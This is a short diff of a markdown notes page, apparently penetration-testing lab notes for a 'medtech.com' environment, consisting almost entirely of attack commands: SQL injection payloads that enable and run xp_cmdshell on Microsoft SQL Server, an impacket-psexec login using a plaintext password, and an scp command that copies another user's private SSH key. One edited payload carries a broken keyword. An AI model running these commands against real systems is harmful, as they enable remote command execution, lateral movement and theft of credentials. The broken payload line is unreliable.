@@ -1,7 +1,7 @@
 [[Editing Copy Page]]
 
 ```
-test' ; RECONFIGURE;;--
+impacket-psexec medtech.com/leon:'rabbit:)'@192.168.162.120
 ```
 
 ```
@@ -21,7 +21,7 @@ test' ; EXECUTE xp_cmdshell 'whoami';;--
 ```
 
 ```
-test'; EXECUTE sp_configure show advanced options, 1; RECONFIGURE; EXECUTE sp_configure xp_cmdshell, 1; RECONFIGURE; EXECUTE xp_cmdshell whoami;--
+test'; EXECUTE sp_configure show advanced options, 1; RECONFIGURE; EXECUTE sp_configure xp_cmdshell, 1; RECONFIGURE; EXECUT E xp_cmdshell whoami;--
 ```
 
 ```
@@ -60,7 +60,7 @@ Select-Object Name, DisplayName, State, StartMode, StartName, PathName
 ```
 
 ```
-
+scp mario@192.168.162.122:/home/mario/.ssh/id_rsa .
 ```
 
 ```
